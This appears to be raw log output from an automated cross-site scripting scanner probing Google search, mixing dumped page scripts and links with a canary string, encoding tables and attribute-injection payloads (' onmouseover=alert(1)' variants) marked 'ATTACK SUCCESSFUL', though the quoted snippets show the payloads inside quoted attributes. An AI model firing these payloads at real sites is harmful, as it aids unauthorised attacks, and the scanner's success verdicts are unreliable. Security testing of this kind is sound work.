0)","MiTaT":"#1A73E8","QSF9Ec":"","IvNqzc":"true","fQC6Cf":"2px","Tae7A":"true","pPtK5":"6","F4ULTd":"true","ue6nDb":"Roboto-Medium,Roboto-Regular","VXIo7d":"8px","ppkaeb":"0","bDOvJc":"false","Ym5Ycb":"false","uRoR4d":"false","kkVYtc":"false","FbN3Qc":"rgba(0,0,0,.87)","srQSvc":"true","BoqNoc":"20px","tyCgpc":"#fff","iryGqc":"2","sPiebd":"false","khoEPb":"#1a0dab","T1V3fc":"#f4b400","SezQgf":"500","N31mf":"false","xFbXr":"rgba(0,102,33,1)","LnZAkd":"false","gbf9Eb":"58","xz9C5b":"true","QnH6ad":"16","KgXmrd":"true","NW4nA":"rgba(255,255,255,.7)","in3Ilb":"#222","voc95c":"false","vhCwfc":"false","lLCPB":"true","IfHuyb":"rgba(0,0,0,.54)","VnH1Zb":"normal","AYXCHc":"false","YWHUvb":"18px","X4yPd":"#1c3aa9","zhkRO":"%.@.1,1,1,1,1,1,0,0,0,1]\n","B8Dib":"rgba(0,0,0,.87)","qj36Ef":"#323232","JyBo2c":"false","WxHUzd":"true","ib0wve":"rgba(153,153,153,.2)","ZxI7Af":"#fafafa","K2vQjf":"#f8f8f8","MoAfyf":"#fff","yFVHo":"true","pch72b":"false","auaxA":"#222","bVUXme":"25","EqX55c":"652","JpB3Ue":"60","mJempe":"13","VbmVYd":"true","W445Dc":"20","tJ4Jdf":"11","D8A8he":"true","rsd6be":"1","jg5SCd":"false","Nk1Bhf":"#4285f4","a7rhWc":"false","XgWQKd":"true","xBx7Dc":"36","hbfefd":"#1A73E8","I69zkb":"rgba(204,204,204,.25)","iwHJId":"15","FiZWae":"32","oFa0q":"#fafafa","imHXAf":"true","BYw9f":"false","PIn0Ab":"1px solid #DFE1E5","rWPbFe":"rgba(255,255,255,1)","g635Ab":"2px","xvI8we":"#212121","SfSmD":"#ebebeb","BW8dtd":"rgba(248, 248, 248, 1)","tuTJ6d":"#b8b8b8","FF58Bf":"true","aKuscd":"#AECBFA","q7vEEb":"false","z70S0c":"false","pLhKvc":"0","i7mh3e":"16","eXPt4e":"400","B0husb":"true","Dc0uuf":"16","hqg9c":"#1878f0","PuOePe":"false","gqXETb":"#db4437","umYEvb":"false","AYVQWe":"20px","UNVSy":"false","wB1JTc":"false","JcUGee":"rgba(0,0,0,.54)","lVRwic":"false","nMRhJe":"false","FYBlgf":"false","xDKXr":"false","TUhOL":"#fafafa","WMBRj":"#009688","qDYzS":"0 2px 10px 0 rgba(0,0,0,0.2)","L6WyEf":"true","QldWK":"6","bmAEG":"#d9d9d9","Vdtb3d":"true","oyB9kf":"rgba(0,0,0,.87)","seVajd":"rgba(0,0,0,.12)","A5tF3b":"false","gjAni":"#3c4043","hWyTvf":"false","NvsKMd":"true","AQEr7b":"#c6c6c6","RZ03Ve":"#5677fc","iDTSkb":"true","bXvyY":"#fff","hgWJ8c":"false","cdRSXc":"false","y2Hs7d":"false","z1x4kc":"true","ENmP1c":"rgba(204,204,204,.15)","kVbEH":"false","o07h3e":"0 4px 5px rgba(0,0,0,.16)","LIYDac":"arial,sans-serif","KFdH8":"true","owXwYb":"#f8f8f8","o9mzkf":"false","QA73ad":"false","rx1dvd":"#f3f3f3","wFGKdc":"false","GzC2p":"#fff","dTMnbc":"false","YXGVrd":"true","UnFEre":"16","vIMrp":"true","bmQ7Rb":"false","klgere":"invert(1) hue-rotate(180deg)","qmiCId":"true","eGDqv":"false","WyvaRd":"0 1px 1px rgba(0,0,0,.16)","Utapxe":"-webkit-","ruHO7c":"#dd191d","h29koe":"32","tqmosb":"#fff","ConpTc":"false","o28sBd":"false","RJegIe":"#fffff0","y519we":"true","OjG6Qc":"#000","ODgkgd":"#fff"};window.IJ_values=["#fff","rgba(0,102,33,1)","rgba(0,0,0,.87)","rgba(0,0,0,.54)","rgba(255,255,255,1)","rgba(255,255,255,.7)",false,"%.@.\"\",\"\",\"0\",null,null,null,1]\n","0","%.@.null,1]\n","%.@.]\n","oV+U8LhG0gYEgraEhXRo3g\u003d\u003d","%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","en-PK",false,"","%.@.1586777540419395,104383203,889774408]\n",false,"/_/WizRpcUi/"];})();google.x(null, function(){(function(){(function(){google.csct={};google.csct.ps='AOvVaw0vz7GuuLa0_K6k5JPhmjsN\x26ust\x3d1586863940468489';})();})();(function(){(function(){google.csct.pi=true;})();})();(function(){(function(){
+function f(){for(var c="&cshid="+google.cshid,d=document.querySelectorAll('[href^="/"]'),e=0,b;b=d[e++];){var a=b.getAttribute("href");a.match(/[\?|&](ei|ved)=/)&&-1==a.indexOf("cshid=")&&(-1==a.search("#")?b.setAttribute("href",a+c):(a=a.split("#"),b.setAttribute("href",a[0]+c+"#"+a[1])))}d=document.querySelectorAll("[ping]");for(e=0;b=d[e++];)a=b.getAttribute("ping"),-1==a.indexOf("cshid=")&&b.setAttribute("ping",a+c)};google.csh=google.csh||{};google.csh.ict=function(c){google.cshid&&(c&&window.MutationObserver?google.dclc(function(){(new MutationObserver(f)).observe(document.querySelector("body"),{attributes:!0,childList:!0,subtree:!0,characterData:!0})}):google.dclc(f))};}).call(this);})();(function(){(function(){var umo=false;google.csh.ict(umo);})();})();(function(){window.jsl=window.jsl||{};window.jsl.dh=window.jsl.dh||function(i,c,d){try{var e=document.getElementById(i);if(e){e.innerHTML=c;if(d){d();}}else{if(window.jsl.el){window.jsl.el(new Error('Missing ID.'),{'id':i});}}}catch(e){if(window.jsl.el){window.jsl.el(new Error('jsl.dh'));}}};})();(function(){window.jsl.dh('hdtbMenus','\x3cdiv class\x3d\x22hdtb-mn-cont\x22\x3e\x3cdiv id\x3d\x22XJDHvf\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAny time\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22qdr_\x22 tabindex\x3d\x220\x22\x3eAny time\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_h\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:h\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQpwV6BAgLEBY\x22\x3ePast hour\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_d\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:d\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQpwV6BAgLEBc\x22\x3ePast 24 hours\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_w\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:w\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQpwV6BAgLEBg\x22\x3ePast week\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_m\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:m\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQpwV6BAgLEBk\x22\x3ePast month\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_y\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:y\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQpwV6BAgLEBo\x22\x3ePast year\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22vjyzWd\x22\x3e\x3cdiv jscontroller\x3d\x22Uuupec\x22 data-m\x3d\x22true\x22\x3e\x3cspan class\x3d\x22q\x22 id\x3d\x22cdrlnk\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22EEGHee\x22 data-ved\x3d\x222ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQpwV6BAgLEBs\x22\x3eCustom range...\x3c/span\x3e\x3cdiv class\x3d\x22n5Ug4b\x22 style\x3d\x22display:none\x22\x3e\x3cdiv class\x3d\x22vOvh1b\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22J6UZg\x22\x3e\x3cdiv class\x3d\x22Jy9Ore\x22\x3eCustomised date range\x3c/div\x3e\x3clabel class\x3d\x22Qtsmnf tmDYm\x22 for\x3d\x22OouJcb\x22\x3eFrom\x3c/label\x3e\x3clabel class\x3d\x22Qtsmnf iWBKNe\x22 for\x3d\x22rzG2be\x22\x3eTo\x3c/label\x3e\x3cdiv class\x3d\x22Gwgzqd\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22NwEGxd\x22\x3e\x3cdiv class\x3d\x22qomYCd\x22\x3e\x3c/div\x3e\x3cform action\x3d\x22/search\x22 class\x3d\x22T3kYXe\x22 method\x3d\x22get\x22\x3e\x3cinput name\x3d\x22q\x22 value\x3d\x27(uvw\x22xyz\x26#39;yxz\x26lt;/zxy\x27 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22source\x22 type\x3d\x22hidden\x22 value\x3d\x22lnt\x22\x3e\x3cinput value\x3d\x22cdr:1,cd_min:x,cd_max:x\x22 id\x3d\x22HjtPBb\x22 name\x3d\x22tbs\x22 type\x3d\x22hidden\x22\x3e\x3cinput value\x3d\x22\x22 name\x3d\x22tbm\x22 type\x3d\x22hidden\x22\x3e\x3cinput class\x3d\x22OouJcb ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22OouJcb\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22rzG2be ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22rzG2be\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22Ru1Ao ksb mini\x22 value\x3d\x22Go\x22 tabindex\x3d\x220\x22 type\x3d\x22submit\x22 jsaction\x3d\x22tnv.scf\x22\x3e\x3c/form\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAll results\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22li_\x22 tabindex\x3d\x220\x22\x3eAll results\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22li_1\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dli:1\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQpwV6BAgLEB4\x22\x3eVerbatim\x3c/a\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3c/div\x3e');})();(function(){google.drty&&google.drty();})();});</script>
+
+----------------------------------------------------------------------------------
+URI Context: [34]
+<a href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;gbv=1&amp;sei=xE2UXsPMGeOF4-EPyMKjqAM">
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fie%3DUTF-8%26oe%3DUTF-8%26q%3D(uvw%2522xyz%27yxz%253C/zxy" target="_top">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ_AUoAXoECAsQAw">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;source=lnms&amp;tbm=vid&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ_AUoAnoECAsQBA">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;source=lnms&amp;tbm=nws&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ_AUoA3oECAsQBQ">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;source=lnms&amp;tbm=bks&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ_AUoAHoECAsQBw">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;source=lnms&amp;tbm=fin&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ_AUoAXoECAsQCA">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?ie%3DUTF-8%26oe%3DUTF-8%26q%3D(uvw%2522xyz%2527yxz%253C/zxy" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQo_oBegQICxAK">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?ie%3DUTF-8%26oe%3DUTF-8%26q%3D(uvw%2522xyz%2527yxz%253C/zxy#languages" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQo_oBegQICxAL">
+<a class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/setprefs?safeui=on&amp;sig=0_EHLlcRwNs4rDnIgmri5J2l5UFPo%3D&amp;prev=https://www.google.com/search?ie%3DUTF-8%26oe%3DUTF-8%26q%3D(uvw%2522xyz%2527yxz%253C/zxy" id="safesearch" data-ved="2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQo_oBegQICxAM">
+<a href="/advanced_search?q=(uvw%22xyz'yxz%3C/zxy&amp;hl=en" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQo_oBegQICxAN">
+<a class="gL9Hy" href="/search?q=(uvw%22xyz+yzx%3C/zxy&amp;spell=1&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQBSgAegQICxAj">
+<a href="https://books.google.com.pk/books?id=7rWD-TdxKkMC&amp;pg=PA249&amp;lpg=PA249&amp;dq=(uvw%22xyz'yxz%3C/zxy&amp;source=bl&amp;ots=w9awOTa8_f&amp;sig=ACfU3U0_-5VzsYrbkuRQvbtJPoU00lCdaw&amp;hl=en&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ6AEwAHoECAsQJw">
+<a href="https://books.google.com.pk/books?id=k6cpwC8rx2sC&amp;pg=PA70&amp;lpg=PA70&amp;dq=(uvw%22xyz'yxz%3C/zxy&amp;source=bl&amp;ots=8UvikWV_Mj&amp;sig=ACfU3U0VYaS-368foSfCpGop4h9PA4WI2A&amp;hl=en&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ6AEwAXoECAsQLw">
+<a href="https://books.google.com.pk/books?id=ilrDCAAAQBAJ&amp;pg=PA213&amp;lpg=PA213&amp;dq=(uvw%22xyz'yxz%3C/zxy&amp;source=bl&amp;ots=5SwZfjW4lm&amp;sig=ACfU3U2M_fdWWphaO6TaL6gyrwbsGbDWCQ&amp;hl=en&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ6AEwAnoECAsQNQ">
+<a href="https://books.google.com.pk/books?id=pXvwCAAAQBAJ&amp;pg=PA148&amp;lpg=PA148&amp;dq=(uvw%22xyz'yxz%3C/zxy&amp;source=bl&amp;ots=qWAZSaKXj0&amp;sig=ACfU3U3zIu6RTOQxbdt3DOYRgPyqcfGyfA&amp;hl=en&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ6AEwA3oECAsQPA">
+<a href="https://books.google.com.pk/books?id=HAFef5EaFNoC&amp;pg=PA216&amp;lpg=PA216&amp;dq=(uvw%22xyz'yxz%3C/zxy&amp;source=bl&amp;ots=tCcx-95Fxq&amp;sig=ACfU3U3GOhzep7Eu5mAPfUX3zRWPGJISdg&amp;hl=en&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ6AEwBHoECAsQQQ">
+<a href="https://books.google.com.pk/books?id=5VKvopPy5bIC&amp;pg=PA74&amp;lpg=PA74&amp;dq=(uvw%22xyz'yxz%3C/zxy&amp;source=bl&amp;ots=qXrJhL4oFS&amp;sig=ACfU3U3MAwPhnfhLWEv1pPddHTJcEybdJQ&amp;hl=en&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ6AEwBXoECAsQRg">
+<a class="fl" href="/search?q=(uvw%22xyz'+%22yxz%22+%3C/zxy&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ5t4CMAZ6BAgBEAo">
+<a class="fl" href="/search?q=%22(uvw%22%22+xyz'yxz%3C/zxy&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ5t4CMAd6BAgCEAU">
+<a href="https://it-it.facebook.com/notes/aila-feliciano/rotations-on-the-zyx-zxy-xyz-xzy-yzx-yxz-axesassign/124954267547809/" ping="/url?sa=t&amp;source=web&amp;rct=j&amp;url=https://it-it.facebook.com/notes/aila-feliciano/rotations-on-the-zyx-zxy-xyz-xzy-yzx-yxz-axesassign/124954267547809/&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQFjAJegQIBBAB">
+<a class="fl" href="https://webcache.googleusercontent.com/search?q=cache:d8i6pZO5Xz4J:https://it-it.facebook.com/notes/aila-feliciano/rotations-on-the-zyx-zxy-xyz-xzy-yzx-yxz-axesassign/124954267547809/+&amp;cd=10&amp;hl=en&amp;ct=clnk&amp;gl=pk" ping="/url?sa=t&amp;source=web&amp;rct=j&amp;url=https://webcache.googleusercontent.com/search%3Fq%3Dcache:d8i6pZO5Xz4J:https://it-it.facebook.com/notes/aila-feliciano/rotations-on-the-zyx-zxy-xyz-xzy-yzx-yxz-axesassign/124954267547809/%2B%26cd%3D10%26hl%3Den%26ct%3Dclnk%26gl%3Dpk&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQIDAJegQIBBAG">
+<a class="fl" href="/search?q=%22(uvw%22%22+xyz'yxz%3C/zxy&amp;sa=X&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ5t4CMAl6BAgEEAg">
+<a aria-label="Page 2" class="fl" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;ei=xE2UXsPMGeOF4-EPyMKjqAM&amp;start=10&amp;sa=N&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ8tMDegQICxBP">
+<a aria-label="Page 3" class="fl" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;ei=xE2UXsPMGeOF4-EPyMKjqAM&amp;start=20&amp;sa=N&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ8tMDegQICxBR">
+<a aria-label="Page 4" class="fl" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;ei=xE2UXsPMGeOF4-EPyMKjqAM&amp;start=30&amp;sa=N&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ8tMDegQICxBT">
+<a aria-label="Page 5" class="fl" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;ei=xE2UXsPMGeOF4-EPyMKjqAM&amp;start=40&amp;sa=N&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ8tMDegQICxBV">
+<a aria-label="Page 6" class="fl" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;ei=xE2UXsPMGeOF4-EPyMKjqAM&amp;start=50&amp;sa=N&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ8tMDegQICxBX">
+<a aria-label="Page 7" class="fl" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;ei=xE2UXsPMGeOF4-EPyMKjqAM&amp;start=60&amp;sa=N&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ8tMDegQICxBZ">
+<a aria-label="Page 8" class="fl" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;ei=xE2UXsPMGeOF4-EPyMKjqAM&amp;start=70&amp;sa=N&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ8tMDegQICxBb">
+<a aria-label="Page 9" class="fl" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;ei=xE2UXsPMGeOF4-EPyMKjqAM&amp;start=80&amp;sa=N&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ8tMDegQICxBd">
+<a aria-label="Page 10" class="fl" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;ei=xE2UXsPMGeOF4-EPyMKjqAM&amp;start=90&amp;sa=N&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ8tMDegQICxBf">
+<a class="G0iuSb" href="/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;ei=xE2UXsPMGeOF4-EPyMKjqAM&amp;start=10&amp;sa=N&amp;ved=2ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ8NMDegQICxBh" id="pnnext" style="text-align:left">
+<meta content="0;url=/search?q=(uvw%22xyz%27yxz%3C/zxy&amp;gbv=1&amp;sei=xE2UXsPMGeOF4-EPyMKjqAM" http-equiv="refresh">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	True	True	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)']
+
+ATTR Attack Url: https://www.google.com/search?ie=UTF-8&oe=UTF-8&q=" onmouseover="alert(1)
+
+=> ATTACK SUCCESSFUL with Payload: " onmouseover="alert(1)
+Detection of Payload: 
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value='" onmouseover="alert(1)' aria-label="Search" data-ved="0ahUKEwjVpv7-puXoAhUryDgGHfnxCm0Q39UDCAk">
+<img id="dimg_16" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" data-deferred="1" class="rISBZc M4dUYb" height="130" style="margin-left:-43px;margin-right:-44px" title="https://www.youtube.com/watch?v=wtPRPygHLuc" width="261" alt='Image result for " onmouseover="alert(1)'>
+<img id="dimg_18" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" data-deferred="1" class="rISBZc M4dUYb" height="130" style="margin-left:-29px;margin-right:-29px" title="https://sites.google.com/site/tonmouseoveralert1a/home/t-onmouseoveralertdocumentdomain-a" width="232" alt='Image result for " onmouseover="alert(1)'>
+<img id="dimg_20" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" data-deferred="1" class="rISBZc M4dUYb" height="130" style="margin-left:-29px;margin-right:-29px" title="https://www.youtube.com/watch?v=AdyadQhxa5g" width="232" alt='Image result for " onmouseover="alert(1)'>
+<img id="dimg_22" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" data-deferred="1" class="rISBZc M4dUYb" height="130" style="margin-left:-29px;margin-right:-29px" title="https://vimeo.com/235224438" width="232" alt='Image result for " onmouseover="alert(1)'>
+<img data-src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTcRDkTZEkpqYHx9xdei8-wyeyTkdWIxt87oAHSEozk9tLxOepil43ZnMeg0A&amp;s" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" jscontroller="SvnKM" jsaction="load:K1e2pe;lzy_img:eNYuKb;pr_lzy_img:KpWyKc;rcuQ6b:npT2md" class="rISBZc M4dUYb" height="130" style="margin-left:-38px;margin-right:-39px" title="https://twitter.com/hashtag/%22onmouseover%3D%22alert%281%29" width="251" alt='Image result for " onmouseover="alert(1)'>
+<img data-src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwIQMOwygIOUZopqh4-uDaP_R80dfVZjqACcrgBdjl4Dgohkv_J1wxGRwhDA&amp;s" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" jscontroller="SvnKM" jsaction="load:K1e2pe;lzy_img:eNYuKb;pr_lzy_img:KpWyKc;rcuQ6b:npT2md" class="rISBZc M4dUYb" height="130" style="margin-left:-29px;margin-right:-29px" title="https://www.youtube.com/watch?v=XGbgcWwXrKk" width="232" alt='Image result for " onmouseover="alert(1)'>
+<img data-src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRuddifxwQE_iUX-qdd1UVP5_bNIcAJ3d38KyVu36iCmZ50PwiEtA-OA_7fFg&amp;s" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" jscontroller="SvnKM" jsaction="load:K1e2pe;lzy_img:eNYuKb;pr_lzy_img:KpWyKc;rcuQ6b:npT2md" class="rISBZc M4dUYb" height="130" title="https://www.facebook.com/onmousealert/?ref=py_c" width="130" alt='Image result for " onmouseover="alert(1)'>
+<img data-src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTIp2HK83EtO2-swn_KbIQzV_3_0nVfT2eChWHOTgZIdyV72FRMIRSN0UA_&amp;s" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" jscontroller="SvnKM" jsaction="load:K1e2pe;lzy_img:eNYuKb;pr_lzy_img:KpWyKc;rcuQ6b:npT2md" class="rISBZc M4dUYb" height="130" title="http://www.hi5.com/99669656259" width="86" alt='Image result for " onmouseover="alert(1)'>
+<img data-src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTus6f7E3XZpQjh0UyAomlK4kcFIzfcXnOhs_TZLumLD6T_VoHtlCjMMT1iVw&amp;s" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" jscontroller="SvnKM" jsaction="load:K1e2pe;lzy_img:eNYuKb;pr_lzy_img:KpWyKc;rcuQ6b:npT2md" class="rISBZc M4dUYb" height="130" style="margin-left:-42px;margin-right:-43px" title="https://twitter.com/hashtag/%22onmouseover%3D%22alert%281%29" width="259" alt='Image result for " onmouseover="alert(1)'>
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.google.com/search?ie=UTF-8&oe=UTF-8&q=' onmouseover='alert(1)
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value="' onmouseover='alert(1)" aria-label="Search" data-ved="0ahUKEwjB0KOAp-XoAhWy4zgGHWJhDQ8Q39UDCAk">
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	False	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
